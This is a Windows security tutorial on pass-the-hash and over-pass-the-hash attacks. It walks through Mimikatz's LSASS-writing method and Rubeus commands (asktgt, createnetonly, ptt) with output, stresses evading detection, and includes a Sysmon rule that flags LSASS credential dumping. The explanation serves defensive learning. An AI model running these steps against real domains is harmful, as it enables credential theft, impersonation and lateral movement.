## Introduction

In the realm of cybersecurity, **pass-the-hash** attacks have become a potent weapon for attackers. By leveraging password hashes, adversaries can bypass the need for plaintext passwords and gain unauthorized access to systems. In this tutorial, we’ll explore the mechanics of pass-the-hash attacks, from understanding hash structures to practical exploitation techniques. Buckle up as we delve into the dark corners of authentication security.

> The **Pass-The-Hash** technique is an essential foundation of lateral movement on Windows. It allows you to assign the rights associated with a user based solely on their NT hash. However, this technique, which is commonly used by **Mimikatz**, is easily detectable. Besides, it requires requesting Local Administrator rights to write to the **LSASS.exe** process.

In this article, we will briefly see how Pass-The-Hash works, and then analyze how Mimikatz's PTH (Pass-The-Hash) module works. Finally, we will see a technique offering better OPSec (Operation Security) and not requiring Local Administrator rights.

* * *

## Pass The Hash - Overview

PTH is a technique exploiting the operation of the NTLMv1/v2 protocols to authenticate to a remote resource without using the user's plain text password. First, let's see the basic operation of the NTLM protocol:

- First, the client will request a "negotiation" (type 1 message) to agree with the server on the supported functions.
- The server sends back a "challenge" (type 2 message), which is a random value generated on each request.
- The client returns the "response" of the challenge (type 3 message). This is quite simply the encryption of the challenge using the NT hash as the encryption key.

This is when the server will verify the challenge. Either by reproducing it with the client's NT hash in the SAM database if it is a local account or by sending the challenge back to the domain controller if it is a domain account.

What must be understood here is that the user's plain text password never comes into account. Only its hash is useful! It is therefore easy for an attacker who only has the hash of an account to authenticate with domain resources. However, this technique has limits depending on the User Access Control (UAC) policies configured in the system.

* * *

## Mimikatz and PTH

[Mimikatz](https://github.com/gentilkiwi/mimikatz) it's now well known to extract plaintexts passwords, hash, PIN code, and Kerberos tickets from memory. Mimikatz can also perform pass-the-hash, pass-the-ticket, or build Golden tickets.

Several tools propose the use of PTH during authentication but the operations differ. Even if NTLM does not take into account the plain text password, Windows is not designed to let the user directly enter his NT hash as an authentication method, it is, therefore necessary to adapt to allow this operation to be done.

This is what **impacket** does for example. This Python library provides very low-level access to Windows packages. This allows in particular, to rewrite challenge/response packets directly based on the hash given as input. Thus, the re-implementation of the SMB stack makes it possible to dispense with the use of the plain text password and to pass the hash directly to the targeted machine. Mimikatz and its `sekurlsa::pth` command took another approach rewriting hashes in memory. Here is the piece of code used by this tool:

```html
if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
{
    kprintf(L" | PID %u\n | TID %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
    if(OpenProcessToken(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
    {
           if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
           {
               kuhl_m_sekurlsa_pth_luid(&data);
```

We quickly understand that Mimikatz will create a new process then write in the "Logon Session" associated with the token via the `kuhl_m_sekurlsa_pth_luid` function. This implies two things:

- Mimikatz will write to the `LSASS.exe` process, so you must be a local administrator of the machine.
- An OpenProcess will be performed on `LSASS.exe`, the access rights requested by Mimikatz are very specific and will raise an alert if detection rules are properly configured.

```html
<Rule groupRelation="and">
    <TargetImage name="technique_id=T1003,technique_name=Credential Dumping" condition="is">C:\Windows\system32\lsass.exe</TargetImage>
    <GrantedAccess>0x1FFFFF</GrantedAccess>
</Rule>
```

* * *

## Over-Pass-The-Hash and Rubeus

As we have seen, the Mimikatz technique has limitations as well as poor OPSec. Let's see what solutions can bring us to an equivalent result while avoiding the limitations of Mimikatz.

[Rubeus](https://github.com/GhostPack/Rubeus) is a `C#` toolset for raw Kerberos interaction and abuses. This project offers a multitude of features such as kerberoast, asreproast, s4u, and much more. Here, we will use several of these features to perform an OPTH (Over-Pass-The-Hash).

The OPTH is a revisit of the classic PTH where we use the obtained NT hash to request a ticket of type TGT to the domain controller to then inject it into a process. Thus, we are going to free ourselves from the NTLM protocol which is now less used in favor of Kerberos and we will also free ourselves from the rewrite of `LSASS.exe`. This makes a better OPSec possible and does not require us to be Local Administrator.

Let us now see in practice the realization of this technique with Rubeus. First, we will request a TGT ticket from the domain controller using the `asktgt` command:

```html
C:\Rubeus>Rubeus.exe asktgt /user:<redacted> /rc4:<redacted>

[*] Action: Ask TGT

[*] Using rc4_hmac hash: <redacted>
[*] Building AS-REQ (w/ preauth) for: 'domain\<redacted>'
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIFXDCCB[…]WMuaW8=

[*] Action: Describe Ticket

  UserName      :  <redacted>
  UserRealm     :  <redacted>
  ServiceName   :  krbtgt/<redacted>
  ServiceRealm  :  <redacted>
  StartTime     :  24/05/2020 16:18:45
  EndTime       :  25/05/2020 02:18:45
  RenewTill     :  04/06/2020 16:18:45
  Flags         :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType       :  rc4_hmac
  Base64(key)   :  k++fpN2g7xZn8bjbdD+xQg==
```

Our ticket is simply the string converted into base64. We must now remove the line breaks to have the base64 in the form of a character string. Another important detail, a "Logon Session" can only accommodate one TGT ticket. If we injected our TGT ticket into an existing "Logon Session", we will encounter some problems. To remedy this, we can use the `createnetonly` feature which allows us to create a hidden process with `SECURITY_LOGON_TYPE 9`. This technique will allow us to inject our ticket into complete security and serenity.

```html
C:\Rubeus>Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe"

 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.3.3


[*] Action: Create Process (/netonly)

[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 9936
[+] LUID            : 0x4a0717f
```

Obviously, this command generates an event id type 1 "Process Created". It is now possible to pass our ticket in this "Logon Session" via the Rubeus `ptt` command:

```html
C:\Rubeus>Rubeus.exe ptt /ticket:<ticket en base64> /luid:0x4a0717f

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

At this point, we can check the presence of our ticket in this process using the Rubeus `triage` command:

```html
----------------------------------------------------------------------------------
| LUID      | UserName               | Service              | EndTime            |
----------------------------------------------------------------------------------
| 0x4a0717f | redacted @ redacted    | krbtgt/redacted      | 25/05/2020 02:18:45|
----------------------------------------------------------------------------------
```

Perfect! This process is now linked to a "Logon Session" containing the TGT ticket requested using the user's NT hash. If we migrate in this process via the `inject` command from **Cobalt Strike** or `migrate` from **Meterpreter**, we will have the rights associated with the spoofed user. Note that we have not opened the `LSASS.exe` process since the Rubeus PTT is done as follows:

```html
if(arguments.ContainsKey("/ticket"))
{
    string kirbi64 = arguments["/ticket"];
    if(Helpers.IsBase64String(kirbi64))
    {
        byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
        LSA.ImportTicket(kirbiBytes, luid);
```

The `ImportTicket` function is based on the `LsaCallAuthenticationPackage` function:

```html
var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
Marshal.StructureToPtr(request, inputBuffer, false);
Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
```

Thus, no capricious "patch" was made on LSASS.exe which allows us to keep better OPSec.

* * *

## Conclusion

In summary, pass-the-hash attacks pose a significant threat to system security. As defenders, it’s crucial to stay informed about these techniques and implement robust measures to prevent them. Remember that protecting your organization’s credentials is not just about passwords; it’s about safeguarding the very keys to your digital kingdom.